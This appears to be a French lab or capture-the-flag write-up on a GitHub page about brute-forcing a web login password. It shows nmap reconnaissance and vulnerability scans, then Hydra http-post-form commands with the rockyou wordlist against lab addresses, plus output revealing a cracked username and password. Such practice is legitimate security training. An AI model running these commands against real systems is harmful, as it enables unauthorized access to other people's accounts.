# Brute force mot de passe   

___

Les étapes :     
**ifconfig** pour avoir le masque sous réseau et en déduire l'IP du réseau   
Scan du réseau pour voir l'ensemble des ports ouverts et des machines connectées avec **nmap IP du réseau**    
Obtenir des infos sur la cible (son adresse IP, ses ports ouverts, les statuts des ports et les services qu'ils utilisent, son adresse mac, son OS)   
avec **nmap -O IP de la machine connectée** et **nmap --script default IP de la machine connectée au réseau**          
Scan des vulnérabilités avec **nmpap -v --script vuln IP de la machine connectée**  
____


![image](https://github.com/techerbeatrice/brute_force_mot_de_passe/assets/138071140/27181ac6-8086-46bf-82a4-8e9e939d99f1)

![image](https://github.com/techerbeatrice/brute_force_mot_de_passe/assets/138071140/2e29b2a4-7129-4805-80ac-747e6691bb0d)


![image](https://github.com/techerbeatrice/brute_force_mot_de_passe/assets/138071140/421c9817-c264-406d-91b6-289da34d0a7d)

![image](https://github.com/techerbeatrice/brute_force_mot_de_passe/assets/138071140/2fd3b248-1870-4147-9fc5-da17a689d2b6)

![image](https://github.com/techerbeatrice/brute_force_mot_de_passe/assets/138071140/03415c7f-de60-4abb-812c-adda0fd781fb)

https://gist.githubusercontent.com/techerbeatrice/8204e406ba94922aba76167b08c2c38e/raw/fad76d1f4dc16377b9ecd98f9f6f52c13e6a4443/gistfile1.txt


![image](https://github.com/techerbeatrice/brute_force_mot_de_passe/assets/138071140/419dbeba-f18e-4c21-9d4c-df2f7cbbadfb)

_____

Le lien php à craquer :    

http://192.168.56.104/login.php?login=admin

_____

Tutoriel commande sur Hydra :    

hydra  -l admin -P /usr/share/wordlists/rockyou.txt 192.168.56.104 http-post-form "/login:username=^USER^&password=^PASS^:F=Mot de passe invalide" -V

Comment utiliser hydra sur un formulaire web?
Pour faire du bruteforce avec hydra sur une formulaire web, il faudra utiliser la syntaxe suivante
**hydra -l -P http-post-form "{lien vers la page de connexion}:{les paramètres du formulaire}:F={message a rechercher sur la page si la connexion échoue}"**

Dans notre cas l’adresse de la cible est http://192.168.56.104/login, le message d’erreut est “Mot de passe invalide”, et enfin les paramètres de la requête que nous avons pu avoir grâce a l’option réseau du web develloper de firefox.


La commande finale donne:

hydra -l molly -P rockyou.txt 10.10.219.212 http-post-form "/login:username=^USER^&password=^PASS^:F=Your password is incorrect" -V. 
Résultat…

[80][http-post-form] host: 10.10.219.212   login: molly   password: sunshine
1 of 1 target successfully completed, 1 valid password found


